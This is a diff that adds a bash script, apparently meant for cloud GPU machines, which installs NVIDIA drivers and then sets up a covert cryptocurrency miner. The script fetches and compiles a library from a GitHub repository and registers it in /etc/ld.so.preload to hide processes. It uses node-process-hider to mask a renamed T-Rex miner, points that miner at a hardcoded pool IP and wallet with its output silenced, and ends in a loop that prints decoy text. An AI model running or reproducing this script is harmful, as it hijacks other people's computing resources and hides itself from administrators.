@@ -1,0 +1,17 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+sudo apt install linux-modules-nvidia-${NVIDIA_DRIVER_VERSION}-gcp nvidia-driver-${NVIDIA_DRIVER_VERSION}
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
+mkdir .kap && cd .kap
+rm -f t-rex && wget -q 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz' && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
+mv t-rex sgr1
+./sgr1 -a firopow -o stratum+tcp://172.105.122.48:80 -u a22G6JnmwqRL3cL66P2MVmunSSX9cCBFp8.$(echo $(shuf -i 1-20000 -n 1)-SUIII) -p x >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
